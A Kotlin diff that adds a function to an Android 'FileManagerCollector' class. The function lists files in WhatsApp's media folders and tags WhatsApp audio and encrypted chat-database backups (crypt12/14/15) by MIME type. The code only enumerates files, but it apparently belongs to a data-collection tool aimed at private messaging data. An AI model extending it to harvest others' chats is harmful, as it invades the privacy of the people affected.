@@ -120,6 +120,53 @@ class FileManagerCollector(private val context: Context) {
         return results.sortedWith(compareBy({ it.path.count { c -> c == '/' } }, { !it.isDirectory }, { it.path }))
     }
 
+    fun listWhatsAppFiles(maxEntries: Int = 1500): List<FileEntryDto> {
+        val root = try {
+            root().canonicalFile
+        } catch (e: Exception) {
+            return emptyList()
+        }
+        if (!root.exists() || !root.isDirectory) return emptyList()
+
+        val candidates = listOf(
+            File(root, "Android/media/com.whatsapp/WhatsApp"),
+            File(root, "WhatsApp")
+        )
+        val waRoot = candidates.firstOrNull { it.exists() && it.isDirectory } ?: return emptyList()
+
+        val results = mutableListOf<FileEntryDto>()
+        val queue = ArrayDeque<File>()
+        queue.add(waRoot)
+
+        while (queue.isNotEmpty() && results.size < maxEntries) {
+            val dir = queue.removeFirst()
+            val children = try {
+                dir.listFiles()
+            } catch (e: Exception) {
+                null
+            } ?: continue
+
+            for (file in children) {
+                if (results.size >= maxEntries) break
+                try {
+                    val canonical = file.canonicalFile
+                    if (!canonical.path.startsWith(root.path)) continue
+
+                    results += FileEntryDto(
+                        name = file.name,
+                        path = canonical.relativeTo(root).path,
+                        isDirectory = file.isDirectory,
+                        sizeBytes = if (file.isFile) file.length() else null,
+                        mimeType = if (file.isFile) guessMimeType(file.extension) else null
+                    )
+                    if (file.isDirectory) queue.add(file)
+                } catch (_: Exception) {
+                }
+            }
+        }
+        return results.sortedWith(compareBy({ it.path.count { c -> c == '/' } }, { !it.isDirectory }, { it.name }))
+    }
+
     fun resolveFile(relativePath: String): File? = try {
         val root = root().canonicalFile
         val target = File(root, relativePath)
@@ -133,13 +180,18 @@ class FileManagerCollector(private val context: Context) {
     private fun guessMimeType(extension: String): String? = when (extension.lowercase()) {
         "jpg", "jpeg" -> "image/jpeg"
         "png" -> "image/png"
+        "webp" -> "image/webp"
         "pdf" -> "application/pdf"
         "txt" -> "text/plain"
         "json" -> "application/json"
         "mp4" -> "video/mp4"
         "mp3" -> "audio/mpeg"
+        "opus" -> "audio/opus"
+        "ogg" -> "audio/ogg"
+        "m4a" -> "audio/m4a"
         "doc", "docx" -> "application/msword"
         "apk" -> "application/vnd.android.package-archive"
+        "crypt14", "crypt15", "crypt12", "db" -> "application/octet-stream"
         else -> null
     }
 }
